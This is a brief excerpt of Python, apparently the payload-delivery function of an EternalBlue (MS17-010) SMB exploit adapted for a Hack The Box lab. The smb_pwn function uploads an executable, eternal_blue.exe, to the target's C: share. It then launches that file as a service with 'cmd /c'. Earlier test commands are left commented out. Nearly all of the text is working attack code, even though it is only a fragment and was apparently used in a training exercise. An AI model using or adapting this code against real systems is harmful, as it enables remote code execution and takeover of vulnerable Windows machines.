...
def smb_pwn(conn, arch):
	...
	#smb_send_file(smbConn, sys.argv[0], 'C', '/eternal_blue.exe')
	smb_send_file(smbConn, '/home/kali/htb/blue/10.129.97.178/exploit/eternal_blue.exe', 'C', '/eternal_blue.exe')	
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	service_exec(conn, r'cmd /c c:\eternal_blue.exe')
